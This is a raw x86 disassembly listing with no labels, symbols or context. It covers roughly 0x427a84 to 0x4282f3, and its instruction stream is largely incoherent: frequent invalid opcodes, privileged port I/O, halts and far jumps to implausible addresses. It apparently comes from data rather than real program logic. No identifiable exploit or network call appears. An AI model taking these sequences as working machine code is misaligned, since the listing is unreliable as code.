  427a84:	fadd   st,st(6)
  427a86:	or     al,dl
  427a88:	(bad)  
  427a89:	clc    
  427a8a:	add    eax,0xc4f9ddea
  427a8f:	out    0xb3,al
  427a91:	scas   al,BYTE PTR es:[edi]
  427a92:	ret    
  427a93:	mov    dh,0xc4
  427a95:	shl    ah,cl
  427a97:	test   edi,0xcfbecdff
  427a9d:	(bad)  
  427a9e:	sti    
  427a9f:	cmc    
  427aa0:	mov    esi,0xe1ecc1d5
  427aa5:	in     al,dx
  427aa6:	or     cl,bl
  427aa8:	sar    ebp,1
  427aaa:	(bad)  
  427aab:	or     eax,0xf1cc0f0e
  427ab0:	jmp    0x427a7d
  427ab2:	iret   
  427ab3:	enter  0xdbe8,0xb1
  427ab7:	out    0xd4,eax
  427ab9:	mov    ecx,0xb2ecacc4
  427abe:	lock hlt 
  427ac0:	sti    
  427ac1:	loop   0x427abd
  427ac3:	push   es
  427ac4:	(bad)  
  427ac6:	or     bl,ah
  427ac8:	add    edi,ebp
  427aca:	or     esp,esp
  427acc:	(bad)  
  427acd:	out    dx,al
  427ace:	jmp    0x427ab4
  427ad0:	stos   BYTE PTR es:[edi],al
  427ad1:	fsubr  DWORD PTR [ecx-0x481e2b1b]
  427ad7:	ror    bh,cl
  427ad9:	out    0xd7,eax
  427adb:	int    0xf8
  427add:	in     al,0xfe
  427adf:	jecxz  0x427adf
  427ae1:	cmc    
  427ae2:	out    dx,eax
  427ae3:	jmp    ebx
  427ae5:	hlt    
  427ae6:	out    0x5,eax
  427ae8:	clc    
  427ae9:	ror    DWORD PTR [edx],0x2
  427aec:	fdivp  st(7),st
  427aee:	or     esp,edi
  427af0:	test   eax,0xc7acb2b3
  427af5:	test   bh,0xce
  427af8:	stc    
  427af9:	out    dx,al
  427afa:	in     al,dx
  427afb:	mov    bh,0xda
  427afd:	repz shl ecx,cl
  427b00:	add    esi,ebp
  427b02:	add    dh,ch
  427b04:	loopne 0x427af7
  427b06:	fcmovnbe st,st(5)
  427b08:	add    ebx,edx
  427b0a:	enter  0xd50f,0xce
  427b0e:	(bad)
  427b11:	lods   eax,DWORD PTR ds:[esi]
  427b12:	ret    
  427b13:	(bad)  
  427b14:	ret    
  427b15:	mov    al,0xef
  427b17:	loop   0x427b10
  427b19:	in     eax,0xd6
  427b1b:	in     al,0xd0
  427b1d:	stc    
  427b1e:	mov    ch,0xba
  427b20:	fcmovne st,st(4)
  427b22:	add    al,bl
  427b24:	fchs   
  427b26:	add    eax,0xf504c1d7
  427b2b:	aam    0xc9
  427b2d:	into   
  427b2e:	cld    
  427b2f:	loope  0x427afb
  427b31:	out    0xe0,al
  427b33:	ror    edx,0xaa
  427b36:	ret    0xcee0
  427b39:	(bad)  
  427b3a:	push   DWORD PTR [ebp-0x2e113112]
  427b40:	shl    DWORD PTR [esi-0x1f09fe06],cl
  427b46:	(bad)  
  427b47:	lock aam 0xf
  427b4a:	add    ah,bl
  427b4c:	aam    0xd9
  427b4e:	fldl2t 
  427b50:	fdiv   DWORD PTR [ebx-0x3d390f0a]
  427b56:	aam    0xe7
  427b58:	icebp  
  427b59:	fdiv   st,st(1)
  427b5b:	mov    edi,0xd2d0c4f2
  427b60:	fdiv   st(1),st
  427b62:	pop    es
  427b63:	lock clc 
  427b65:	or     ebp,edx
  427b67:	(bad)  
  427b68:	icebp  
  427b69:	cli    
  427b6a:	fcomp  st(5)
  427b6c:	into   
  427b6d:	out    0x2,eax
  427b6f:	adc    edi,DWORD PTR [edi+esi*8-0x364d1935]
  427b76:	in     al,dx
  427b77:	mov    al,0xd9
  427b79:	enter  0xb6d3,0xf9
  427b7d:	(bad)  
  427b7f:	mov    al,0xd2
  427b81:	cmc    
  427b82:	in     eax,dx
  427b83:	fcmovb st,st(7)
  427b85:	add    al,0xde
  427b87:	repnz out 0xa,eax
  427b8a:	hlt    
  427b8b:	inc    edi
  427b8d:	add    esp,eax
  427b8f:	loop   0x427b3a
  427b91:	repz fdiv QWORD PTR [ebx-0x2a110409]
  427b98:	clc    
  427b99:	mov    bh,0xb7
  427b9b:	iret   
  427b9c:	mov    bl,0xdc
  427b9e:	jmp    0xefff6a84
  427ba3:	rcl    cl,0xf5
  427ba6:	add    eax,0xe5e2d1fb
  427bab:	fcmovb st,st(7)
  427bad:	push   es
  427bae:	lds    edx,FWORD PTR [ebx]
  427bb0:	mov    ebp,0xe3add6c5
  427bb5:	out    0xec,eax
  427bb7:	sar    edx,0xf7
  427bba:	aad    0xd0
  427bbc:	shl    bl,cl
  427bbe:	loop   0x427bbb
  427bc0:	fcomi  st,st(5)
  427bc2:	not    esi
  427bc4:	test   ch,0xd1
  427bc7:	fsubr  st(7),st
  427bc9:	or     BYTE PTR [esi],cl
  427bcb:	fstp   st(0)
  427bcd:	iret   
  427bce:	jmp    0xb0325ebf
  427bd3:	lods   al,BYTE PTR ds:[esi]
  427bd4:	jmp    0xc7e6:0xe8a8ceac
  427bdb:	mov    eax,0xf5d7e4eb
  427be0:	mov    ebx,0xd9daecef
  427be5:	clc    
  427be6:	sar    ebx,1
  427be8:	out    0xe8,al
  427bea:	fsubr  st(4),st
  427bec:	cld    
  427bed:	dec    DWORD PTR [ebx]
  427bef:	in     eax,0xea
  427bf1:	test   ebp,0xe4b1bde2
  427bf7:	mov    ebx,0xf2b0f2fa
  427bfc:	jmp    0xc3f9:0xd8d8beda
  427c03:	in     eax,0xd4
  427c05:	loope  0x427bd2
  427c07:	mov    esp,0x7c0fec4
  427c0c:	pop    es
  427c0d:	into   
  427c0e:	leave  
  427c0f:	psubusb mm5,mm2
  427c12:	test   eax,0xc3f5b3ad
  427c17:	(bad)  
  427c18:	jmp    0xbcfb:0xedd2fbd9
  427c1f:	fdiv   st,st(1)
  427c21:	repnz add esi,ebx
  427c24:	fcomi  st,st(2)
  427c26:	aad    0xeb
  427c28:	ffreep st(2)
  427c2a:	(bad)  
  427c2b:	jmp    0x427c2b
  427c2d:	or     dh,bl
  427c2f:	or     eax,0xf0d0caaa
  427c34:	jmp    0xbb3d4c30
  427c39:	sar    bl,1
  427c3b:	mov    ch,0xe9
  427c3e:	fcomp  st(3)
  427c40:	lock int3 
  427c42:	neg    ebp
  427c44:	cli    
  427c45:	add    ebx,ebx
  427c47:	add    esp,ebx
  427c49:	add    cl,cl
  427c4b:	(bad)  
  427c4c:	sti    
  427c4d:	add    DWORD PTR [eax],eax
  427c4f:	stc    
  427c50:	(bad)  
  427c51:	fadd   st(5),st
  427c53:	iret   
  427c54:	aad    0xcc
  427c56:	(bad)  
  427c57:	repz mov dh,0xbb
  427c5a:	(bad)  
  427c5c:	in     al,dx
  427c5d:	mov    edi,0xd2d7c8e8
  427c62:	inc    DWORD PTR [esi]
  427c64:	shl    ebp,1
  427c66:	repnz cld 
  427c68:	jmp    0xefd4:0xece7fa01
  427c6f:	or     al,0xde
  427c71:	loop   0x427c3b
  427c73:	mov    cl,0xc5
  427c75:	in     al,0xc3
  427c77:	mov    ebx,0xb9d5cbe9
  427c7c:	(bad)  
  427c7d:	(bad)  
  427c7f:	fucomi st,st(6)
  427c81:	shr    dh,1
  427c83:	in     al,dx
  427c84:	add    ecx,esp
  427c86:	add    esp,edi
  427c88:	jmp    0x427c55
  427c8a:	retf   
  427c8b:	mov    esp,0xf8dadce0
  427c90:	fmulp  st(5),st
  427c92:	mov    al,0xd7
  427c94:	(bad)  
  427c95:	jmp    0x427c92
  427c97:	jmp    0xc0426f71
  427c9c:	icebp  
  427c9d:	hlt    
  427c9e:	mov    cl,0xee
  427ca0:	ret    0xeef0
  427ca3:	add    ah,bh
  427ca5:	loope  0x427cb2
  427ca7:	idiv   bl
  427ca9:	sar    dh,0xed
  427cac:	or     cl,ch
  427cae:	iret   
  427caf:	fnstcw WORD PTR [eax-0x1f1a340f]
  427cb5:	in     al,dx
  427cb6:	lds    edi,FWORD PTR [edx-0x2d2b2c2a]
  427cbc:	jmp    0xd4006aa0
  427cc1:	out    0xc0,eax
  427cc3:	shl    eax,1
  427cc5:	(bad)  
  427cc7:	or     al,BYTE PTR ds:0xe60ed6e0
  427ccd:	fcomp  st(3)
  427ccf:	(bad)  
  427cd1:	in     eax,dx
  427cd2:	out    dx,eax
  427cd3:	ror    eax,0xd1
  427cd6:	repz mov ch,0xec
  427cd9:	out    dx,eax
  427cda:	out    0xfd,eax
  427cdc:	aad    0xcd
  427cde:	cmc    
  427cdf:	xlat   BYTE PTR ds:[ebx]
  427ce0:	repz jecxz 0x427cea
  427ce3:	fld    QWORD PTR [ecx]
  427ce5:	sti    
  427ce6:	out    0xf7,al
  427ce8:	loopne 0x427ce7
  427cea:	or     cl,dh
  427cec:	enter  0xd8d9,0xf2
  427cf0:	fadd   st,st(1)
  427cf2:	jecxz  0x427ca7
  427cf4:	loopne 0x427cd9
  427cf6:	(bad)  [edx-0x2e0d184f]
  427cfc:	(bad)
  427cff:	into   
  427d00:	loope  0x427cff
  427d02:	inc    bl
  427d04:	mov    ebx,0xf5dddee1
  427d09:	cld    
  427d0a:	loopne 0x427d13
  427d0c:	jmp    0xcd477c1e
  427d11:	iret   
  427d12:	test   ebx,0xcfc5e6b2
  427d18:	in     eax,dx
  427d19:	jmp    0xcee9:0xf9cbb5ec
  427d20:	mov    ecx,0xc2d4c3ba
  427d25:	test   bh,0xca
  427d28:	rcl    ch,1
  427d2a:	aad    0xeb
  427d2c:	enter  0xced9,0x9
  427d30:	(bad)  
  427d31:	iret   
  427d32:	loopne 0x427d14
  427d34:	shl    esp,0xd7
  427d37:	int3   
  427d38:	cli    
  427d39:	mov    eax,0xf0b4d8ff
  427d3e:	icebp  
  427d3f:	out    dx,eax
  427d40:	out    dx,eax
  427d41:	xlat   BYTE PTR ds:[ebx]
  427d42:	loope  0x427d1e
  427d44:	test   eax,0xe2ddf6fa
  427d4a:	cli    
  427d4b:	loopne 0x427d57
  427d4d:	std    
  427d4e:	add    cl,BYTE PTR ds:0xc2ded8bf
  427d54:	(bad)
  427d57:	in     eax,0xeb
  427d59:	repnz cli 
  427d5b:	fst    st(4)
  427d5d:	enter  0xcdb5,0xf4
  427d61:	add    esp,ecx
  427d63:	idiv   ebx
  427d65:	(bad)  
  427d67:	fcmovu st,st(5)
  427d69:	or     edx,edi
  427d6b:	cmc    
  427d6c:	jmp    0xead3:0xd80309e3
  427d73:	scas   al,BYTE PTR es:[edi]
  427d74:	aam    0xb0
  427d76:	jmp    0xf4c9:0xc5d5cfba
  427d7d:	leave  
  427d7e:	mov    edx,0xfbd3fbbb
  427d83:	cli    
  427d84:	out    0xc6,eax
  427d86:	(bad)  
  427d87:	dec    BYTE PTR [edx]
  427d89:	out    dx,eax
  427d8a:	ror    DWORD PTR [eax],0x3
  427d8d:	or     al,BYTE PTR ds:0xc6eff1df
  427d93:	enter  0xf0cd,0xcb
  427d97:	stc    
  427d98:	jmp    0x427d5f
  427d9a:	(bad)  
  427d9b:	(bad)  
  427d9c:	lock fdivr st,st(1)
  427d9f:	call   0xc3ff608c
  427da4:	int3   
  427da5:	hlt    
  427da6:	(bad)  
  427da8:	rol    BYTE PTR [eax],1
  427daa:	stc    
  427dab:	dec    BYTE PTR [edi]
  427dad:	fisttp QWORD PTR [esi]
  427daf:	add    al,ah
  427db1:	iret   
  427db2:	leave  
  427db3:	out    dx,eax
  427db4:	in     eax,0xc6
  427db6:	leave  
  427db7:	loop   0x427db3
  427db9:	icebp  
  427dba:	call   0xdf185497
  427dbf:	fcomip st,st(1)
  427dc1:	fstp   st(4)
  427dc3:	fdivr  DWORD PTR [edx+esi*8-0x3f210730]
  427dca:	out    0xe8,al
  427dcc:	or     ecx,eax
  427dce:	ror    DWORD PTR [edi],0xcb
  427dd1:	scas   al,BYTE PTR es:[edi]
  427dd2:	out    dx,eax
  427dd3:	test   al,0xb5
  427dd5:	jmp    0xb7fa:0xd2dbc2db
  427ddc:	out    dx,al
  427ddd:	enter  0xb4ca,0x0
  427de1:	imul   ebp
  427de3:	lock push es
  427de5:	rcr    edi,cl
  427de7:	ror    ebx,0xd6
  427dea:	out    dx,al
  427deb:	add    ch,dh
  427ded:	or     DWORD PTR [esp+ecx*1],ecx
  427df0:	shr    DWORD PTR [edi-0x5339364e],cl
  427df6:	fcmovnu st,st(2)
  427df8:	ftst   
  427dfa:	hlt    
  427dfb:	out    dx,eax
  427dfc:	out    dx,eax
  427dfd:	aam    0xd1
  427dff:	sti    
  427e00:	fdiv   st(0),st
  427e02:	(bad)  
  427e03:	sar    DWORD PTR [ebx-0x2929281b],0xe3
  427e0a:	out    0xdb,al
  427e0c:	add    dl,al
  427e0e:	(bad)  
  427e10:	ret    0xb2ec
  427e13:	shr    DWORD PTR [edi-0x3f13241c],cl
  427e19:	in     eax,0xeb
  427e1b:	test   esp,0xf9ffcef1
  427e21:	repnz ffree st(0)
  427e24:	neg    ch
  427e26:	fnsetpm(287 only) 
  427e28:	pop    es
  427e29:	or     bh,bh
  427e2b:	stc    
  427e2c:	cmc    
  427e2d:	(bad)  
  427e2e:	fucomp st(6)
  427e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e31:	loopne 0x427def
  427e33:	scas   al,BYTE PTR es:[edi]
  427e34:	scas   eax,DWORD PTR es:[edi]
  427e35:	in     al,dx
  427e36:	ret    
  427e37:	out    0xd9,al
  427e39:	in     al,0xe5
  427e3b:	mov    ecx,0xd4f1f3b5
  427e40:	add    dl,al
  427e42:	ret    
  427e43:	shl    cl,1
  427e45:	(bad)  
  427e46:	mov    ebp,0xe1e7db05
  427e4b:	in     eax,0xec
  427e4d:	fild   WORD PTR [esi]
  427e4f:	add    al,0xb3
  427e51:	test   eax,0xaccec7d7
  427e56:	(bad)
  427e59:	(bad)  
  427e5a:	fcmovb st,st(4)
  427e5c:	std    
  427e5d:	fcmove st,st(6)
  427e5f:	sar    al,1
  427e61:	fidivr DWORD PTR [ecx+0xa04dcf4]
  427e67:	fsubr  st(1),st
  427e69:	les    ecx,FWORD PTR [edx]
  427e6b:	add    al,BYTE PTR [esi]
  427e6d:	or     al,0xf2
  427e6f:	shr    BYTE PTR [eax+ecx*8-0x33514e13],cl
  427e76:	out    0xb2,eax
  427e78:	neg    al
  427e7a:	icebp  
  427e7b:	mov    ch,0xf9
  427e7d:	aam    0x3
  427e7f:	(bad)  
  427e80:	mov    edi,0xfe07c0cd
  427e85:	ret    
  427e86:	add    eax,0xc008d5f2
  427e8b:	add    al,0xdb
  427e8d:	iret   
  427e8e:	add    esp,ebp
  427e90:	int3   
  427e91:	in     eax,0xb1
  427e93:	lock mov esp,0xe1d0daf3
  427e99:	out    0xcc,al
  427e9b:	mov    dh,0xf0
  427e9d:	leave  
  427e9e:	retf   
  427e9f:	aam    0xdb
  427ea1:	out    0xb8,eax
  427ea3:	into   
  427ea4:	(bad)  
  427ea5:	out    0xd4,al
  427ea7:	or     ah,ah
  427ea9:	lock mul ebx
  427eac:	(bad)  
  427ead:	jmp    0xe6cc:0xe4e80512
  427eb4:	out    dx,al
  427eb5:	jmp    0xb7ee:0xc0e4bbf6
  427ebc:	jmp    0x427e7d
  427ebe:	mov    edi,0xdedadeee
  427ec3:	mov    eax,0xe104d4fb
  427ec8:	(bad)
  427ecb:	les    ecx,FWORD PTR ds:0xaae1cbc5
  427ed1:	mov    ebp,0xc6cdedac
  427ed6:	xlat   BYTE PTR ds:[ebx]
  427ed7:	sti    
  427ed8:	mov    ch,0xc6
  427eda:	mov    edx,0xc8f5b5d1
  427edf:	icebp  
  427ee0:	clc    
  427ee1:	loop   0x427ed8
  427ee3:	in     al,dx
  427ee4:	hlt    
  427ee5:	out    0xf9,al
  427ee7:	fldl2e 
  427ee9:	cmc    
  427eea:	push   es
  427eeb:	jmp    0x427ef7
  427eed:	std    
  427eee:	loop   0x427ee3
  427ef0:	sar    BYTE PTR [eax-0x1a293551],1
  427ef6:	test   eax,0xb0f7faf1
  427efb:	repnz aad 0xe3
  427efe:	dec    edi
  427f00:	icebp  
  427f01:	in     eax,dx
  427f02:	out    0xf3,eax
  427f04:	icebp  
  427f05:	cmc    
  427f06:	repz or edi,eax
  427f09:	fsubr  st(6),st
  427f0b:	out    dx,al
  427f0c:	jmp    0x427f0e
  427f0e:	push   cs
  427f0f:	fisubr DWORD PTR [eax-0x4933393b]
  427f15:	(bad)  
  427f16:	fcmovbe st,st(4)
  427f18:	mov    ecx,0xbbd7bac8
  427f1d:	aam    0xde
  427f1f:	in     eax,dx
  427f20:	jmp    eax
  427f22:	div    edi
  427f24:	fadd   DWORD PTR [ebx]
  427f26:	retf   
  427f27:	(bad)  
  427f28:	out    0xc7,al
  427f2a:	aam    0xe5
  427f2c:	clc    
  427f2d:	enter  0xd909,0xf2
  427f31:	jmp    0xf9ee:0xe2e3e4a8
  427f38:	mov    dh,0xf5
  427f3a:	sti    
  427f3b:	iret   
  427f3c:	fcmovne st,st(0)
  427f3e:	leave  
  427f3f:	jmp    edx
  427f41:	idiv   ebx
  427f43:	add    ebx,esi
  427f45:	aam    0xf2
  427f47:	mov    eax,0x9ead8fb
  427f4c:	in     al,dx
  427f4d:	fcomp  st(4)
  427f4f:	jmp    0x427f1e
  427f51:	out    dx,eax
  427f52:	loop   0x427f14
  427f54:	leave  
  427f55:	retf   
  427f56:	div    DWORD PTR [eax-0x2111b50]
  427f5c:	mov    ah,0xd8
  427f5e:	mov    esp,0xc7bef0f8
  427f63:	mov    esp,0xd6f1d0bd
  427f68:	lock jmp 0xe806:0xe2ea0ff8
  427f70:	(bad)
  427f74:	enter  0xbbe5,0xf5
  427f78:	into   
  427f79:	(bad)  
  427f7a:	mov    edx,0xedefbddd
  427f7f:	fistp  QWORD PTR [eax-0x80b000a]
  427f85:	fcmovnbe st,st(4)
  427f87:	ffree  st(1)
  427f89:	(bad)  
  427f8b:	loopne 0x427f91
  427f8d:	(bad)
  427f90:	jmp    0xc5204d76
  427f95:	call   0xe5f9728f
  427f9a:	mov    ah,0xed
  427f9c:	stc    
  427f9d:	mov    ah,0xbd
  427f9f:	mov    ebx,0xf0fafecd
  427fa4:	lds    eax,FWORD PTR [eax]
  427fa6:	mov    ebp,0xefc2c204
  427fab:	or     eax,0xdfcdcec6
  427fb0:	int3   
  427fb1:	mov    bl,0xef
  427fb3:	iret   
  427fb4:	lods   eax,DWORD PTR ds:[esi]
  427fb5:	(bad)
  427fb8:	out    0xe6,eax
  427fba:	cli    
  427fbb:	retf   
  427fbc:	xlat   BYTE PTR ds:[ebx]
  427fbd:	(bad)  
  427fbe:	clc    
  427fbf:	mov    ebp,0xe2c3f0c1
  427fc4:	out    0xc0,eax
  427fc6:	jmp    0x427fb8
  427fc8:	shr    edx,1
  427fca:	add    ebx,edi
  427fcc:	in     al,dx
  427fcd:	jecxz  0x427fad
  427fcf:	cld    
  427fd0:	fnstsw WORD PTR [esi-0x13373a23]
  427fd6:	mov    bh,0xca
  427fd8:	(bad)  
  427fd9:	in     al,0xe9
  427fdb:	icebp  
  427fdc:	aam    0xd8
  427fde:	leave  
  427fdf:	shl    dl,1
  427fe1:	enter  0xdafd,0xd8
  427fe5:	add    ebp,edx
  427fe7:	rol    BYTE PTR [edx],cl
  427fe9:	ret    0xc6d6
  427fec:	loop   0x427fbb
  427fee:	loope  0x427ff1
  427ff0:	out    0xb1,eax
  427ff2:	mov    esi,0xf4c4b1de
  427ff7:	mov    al,0xba
  427ff9:	mov    edx,0xbffbe5fe
  427ffe:	xlat   BYTE PTR ds:[ebx]
  427fff:	cli    
  428000:	ret    0xfbe8
  428003:	in     eax,dx
  428004:	(bad)
  428007:	cli    
  428008:	cmc    
  428009:	out    dx,eax
  42800a:	(bad)  
  42800b:	test   BYTE PTR ds:0xe1c9dff8,0xe3
  428012:	shr    BYTE PTR [eax+edx*8-0xb393d11],cl
  428019:	scas   al,BYTE PTR es:[edi]
  42801a:	(bad)  
  42801b:	(bad)  
  42801d:	retf   0xd4f4
  428020:	std    
  428021:	(bad)  
  428022:	mov    ch,0xd5
  428024:	ror    BYTE PTR [ebx],0xdc
  428027:	loop   0x427ffa
  428029:	out    0xd8,al
  42802b:	out    dx,eax
  42802c:	aam    0xf
  42802e:	in     eax,0xfa
  428030:	repnz shl edi,1
  428033:	rol    ch,1
  428035:	shl    al,1
  428037:	aam    0xe8
  428039:	repnz fdiv st,st(4)
  42803c:	std    
  42803d:	fmul   st(6),st
  42803f:	stc    
  428040:	in     al,dx
  428041:	std    
  428042:	aam    0xcc
  428044:	add    ebx,ebx
  428046:	loopne 0x42801f
  428048:	jecxz  0x42800a
  42804a:	in     eax,0xc6
  42804c:	leave  
  42804d:	cld    
  42804e:	stc    
  42804f:	(bad)  
  428051:	mov    cl,0xe5
  428053:	into   
  428054:	(bad)  
  428055:	out    0xf3,eax
  428057:	shl    BYTE PTR [ecx-0x2f0d0434],cl
  42805d:	fdivr  QWORD PTR [ebx-0x2461031]
  428063:	cmc    
  428064:	rcr    eax,1
  428066:	fcmovbe st,st(7)
  428068:	add    eax,0xceeff9fd
  42806d:	dec    BYTE PTR [ecx*1-0xa131140]
  428074:	hlt    
  428075:	in     eax,dx
  428076:	(bad)  
  428077:	into   
  428078:	out    0xc8,eax
  42807a:	shr    ebp,cl
  42807c:	ror    ebx,cl
  42807e:	std    
  42807f:	add    esi,ebx
  428081:	cli    
  428082:	icebp  
  428083:	not    esp
  428085:	mov    esi,0xeac0d0df
  42808a:	mul    edx
  42808c:	jmp    0x42806e
  42808e:	(bad)
  428091:	mov    esi,0xedcbc5a8
  428096:	mov    ebx,0xb8d4b1d9
  42809b:	call   0xdd1f6e99
  4280a0:	repnz std 
  4280a2:	aad    0xe7
  4280a4:	in     al,0xf6
  4280a6:	xlat   BYTE PTR ds:[ebx]
  4280a7:	jmp    0xc5e3:0xc400e7
  4280ae:	(bad)  
  4280b0:	rcl    bh,0xb0
  4280b3:	out    dx,eax
  4280b4:	hlt    
  4280b5:	into   
  4280b6:	out    0xfb,al
  4280b8:	lock ffreep st(5)
  4280bb:	retf   
  4280bc:	mov    edi,0x1bdf6f4
  4280c1:	add    eax,DWORD PTR [edi]
  4280c3:	jecxz  0x42809a
  4280c5:	sar    esi,1
  4280c7:	fmul   st(2),st
  4280c9:	retf   0x5d9
  4280cc:	add    eax,0xefe3e3ee
  4280d1:	mov    esp,0xd1f1c0e7
  4280d6:	iret   
  4280d7:	retf   
  4280d8:	cli    
  4280d9:	loopne 0x4280a7
  4280db:	leave  
  4280dc:	sar    BYTE PTR [ebp-0x42320821],cl
  4280e2:	(bad)  
  4280e4:	ret    
  4280e5:	aam    0xf5
  4280e7:	repnz mov edi,0xd9ebc6d0
  4280ed:	or     ebx,ecx
  4280ef:	or     eax,0xb2c9d3cc
  4280f4:	int    0xd7
  4280f6:	aad    0xb4
  4280f8:	(bad)  
  4280f9:	cmc    
  4280fa:	mov    cl,0xff
  4280fc:	(bad)  
  4280fe:	dec    edi
  428100:	std    
  428101:	out    dx,eax
  428102:	(bad)  
  428103:	mov    ah,0xe7
  428105:	fcmovnu st,st(6)
  428107:	rcr    ebp,1
  428109:	xlat   BYTE PTR ds:[ebx]
  42810a:	jmp    0xa7de:0x10209df
  428111:	rcl    esi,cl
  428113:	jmp    0x4280d7
  428115:	jmp    0x42810a
  428117:	mov    edx,0xd1cfb7f0
  42811c:	mov    ah,0xec
  42811e:	add    ebp,ebp
  428120:	add    edi,DWORD PTR [eax-0x3905382b]
  428126:	lock call ecx
  428129:	add    ch,al
  42812b:	jecxz  0x428110
  42812d:	or     ebp,eax
  42812f:	push   cs
  428130:	lods   eax,DWORD PTR ds:[esi]
  428131:	int3   
  428132:	call   0xe5196a03
  428137:	mov    ch,0xf7
  428139:	mov    ecx,0xd7c9c9ed
  42813e:	cld    
  42813f:	(bad)  
  428141:	xlat   BYTE PTR ds:[ebx]
  428142:	(bad)  
  428143:	(bad)  
  428145:	ret    
  428146:	loopne 0x42812e
  428148:	fcmovnb st,st(7)
  42814a:	(bad)
  42814d:	into   
  42814e:	add    eax,0xd6c6aefc
  428153:	lock lods eax,DWORD PTR ds:[esi]
  428155:	(bad)  
  428157:	lock jmp 0xcf3b3356
  42815d:	push   DWORD PTR [ecx-0x432b0246]
  428163:	ffreep st(1)
  428165:	icebp  
  428166:	fprem1 
  428168:	shr    edi,0xc9
  42816b:	out    dx,eax
  42816c:	cmc    
  42816d:	loop   0x428137
  42816f:	loop   0x428119
  428171:	fcom   st(1)
  428173:	mov    ebp,0xe7e1ccea
  428178:	(bad)
  42817b:	in     eax,dx
  42817c:	in     al,dx
  42817d:	in     al,dx
  42817e:	std    
  42817f:	sti    
  428180:	cli    
  428181:	shr    ah,cl
  428183:	rcr    ecx,0x2
  428186:	aad    0xca
  428188:	(bad)  
  428189:	idiv   ebp
  42818b:	loope  0x428162
  42818d:	fdivp  st(5),st
  42818f:	or     dl,al
  428191:	iret   
  428192:	out    0xc0,eax
  428194:	mov    esp,0xb1f0c1e1
  428199:	(bad)  
  42819a:	retf   0xb5f1
  42819d:	mov    edi,0xb9c1ccfb
  4281a2:	aam    0x6
  4281a4:	icebp  
  4281a5:	lock push es
  4281a7:	inc    al
  4281a9:	leave  
  4281aa:	(bad)  
  4281ac:	or     al,0xee
  4281ae:	loop   0x4281c1
  4281b0:	scas   al,BYTE PTR es:[edi]
  4281b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281b2:	(bad)  
  4281b3:	mov    dl,0xb0
  4281b5:	leave  
  4281b6:	xlat   BYTE PTR ds:[ebx]
  4281b7:	out    dx,al
  4281b8:	test   al,0xca
  4281bb:	fstp   st(7)
  4281bd:	jmp    0xf0335fb1
  4281c2:	mov    eax,0xf1ebf7d6
  4281c7:	cmc    
  4281c8:	fld    QWORD PTR [edx]
  4281ca:	fimul  WORD PTR ds:0xcd0802fb
  4281d0:	jmp    0xcebc:0xf6f1cae6
  4281d7:	(bad)  
  4281d8:	retf   
  4281d9:	xlat   BYTE PTR ds:[ebx]
  4281da:	repz (bad) 
  4281dd:	repnz in al,dx
  4281df:	(bad)  
  4281e0:	cld    
  4281e1:	fdivr  QWORD PTR [ecx+0xf6f5df]
  4281e7:	or     eax,DWORD PTR ds:0xdfeeebf4
  4281ed:	retf   
  4281ee:	dec    ecx
  4281f0:	repz fmul st,st(1)
  4281f3:	into   
  4281f4:	xlat   BYTE PTR ds:[ebx]
  4281f5:	(bad)  
  4281f6:	out    0xcf,eax
  4281f8:	mov    dl,0xc4
  4281fa:	repz (bad) 
  4281fc:	leave  
  4281fd:	hlt    
  4281fe:	retf   
  4281ff:	fcmovne st,st(5)
  428201:	std    
  428202:	repz std 
  428204:	aam    0xd2
  428206:	shl    ch,1
  428208:	fdivr  st(5),st
  42820a:	loope  0x4281ef
  42820c:	or     al,0xf8
  42820e:	add    ebp,esi
  428210:	rcl    eax,cl
  428212:	leave  
  428213:	leave  
  428214:	fstp   st(3)
  428216:	out    0xc2,al
  428218:	mov    ecx,0xd2dbf3da
  42821d:	(bad)  
  42821e:	(bad)  
  42821f:	add    esp,ebx
  428221:	(bad)  
  428222:	shl    dl,1
  428224:	(bad)  
  428225:	(bad)  
  428226:	jmp    0xdc01:0xe9d9e9c1
  42822d:	add    dl,ch
  42822f:	stc    
  428230:	out    dx,al
  428231:	mov    cl,0xae
  428233:	loop   0x428207
  428235:	aam    0xa9
  428237:	lods   al,BYTE PTR ds:[esi]
  428238:	cli    
  428239:	stc    
  42823a:	(bad)  
  42823b:	out    dx,al
  42823c:	shl    bl,cl
  42823e:	mov    eax,0x3bff1
  428243:	into   
  428244:	sti    
  428245:	test   edi,0xd905e6e4
  42824b:	add    al,0xfc
  42824d:	syscall 
  42824f:	leave  
  428250:	shr    DWORD PTR [edx-0x24512f1b],0xea
  428257:	repnz retf 
  428259:	mov    edx,0xe4e9eedb
  42825e:	sar    dh,cl
  428260:	ret    
  428261:	(bad)  
  428263:	ret    0xe4bd
  428266:	(bad)  
  428267:	jecxz  0x42822d
  428269:	out    dx,eax
  42826a:	(bad)  
  42826b:	iret   
  42826c:	leave  
  42826d:	(bad)  
  42826e:	out    dx,eax
  42826f:	jecxz  0x428261
  428271:	(bad)  
  428272:	fst    st(6)
  428274:	mov    bl,0xfb
  428276:	jmp    0x428266
  428278:	mov    dh,0xfa
  42827a:	(bad)
  42827d:	stc    
  42827e:	rol    bl,cl
  428280:	int    0xe0
  428282:	lock mov esi,0x6e703bb
  428288:	jmp    0xefb:0xc0dc1fe
  42828f:	or     ebx,eax
  428291:	test   eax,0xb3d3d0e7
  428296:	hlt    
  428297:	iret   
  428298:	loope  0x428286
  42829a:	retf   0xffba
  42829d:	std    
  42829e:	sar    BYTE PTR [esi+edi*4-0xc23461d],1
  4282a5:	(bad)  
  4282a6:	retf   
  4282a7:	sti    
  4282a8:	in     eax,0xf8
  4282aa:	(bad)  
  4282ab:	in     al,0xef
  4282ad:	out    dx,eax
  4282ae:	clc    
  4282af:	out    dx,al
  4282b0:	test   eax,0xf5e8c4ac
  4282b5:	div    DWORD PTR [edi-0x4f4f2c18]
  4282bb:	fsubp  st(2),st
  4282bd:	mov    esi,0xfb00e3f2
  4282c2:	(bad)  
  4282c4:	repnz add eax,0xdefdcaf1
  4282ca:	or     BYTE PTR [eax],al
  4282cc:	out    dx,al
  4282cd:	in     al,0xb
  4282cf:	jecxz  0x4282a9
  4282d1:	out    dx,eax
  4282d2:	test   al,0xe7
  4282d4:	repz int 0xf4
  4282d7:	shl    ebx,0xf9
  4282da:	(bad)  
  4282dc:	mov    eax,0xcfb0e2b5
  4282e1:	not    edx
  4282e3:	mov    esp,0xd0e5ba03
  4282e8:	add    eax,0xc3bceff8
  4282ed:	pop    es
  4282ee:	or     eax,0xf3e4d1eb
  4282f3:	mov    bl,0xb7
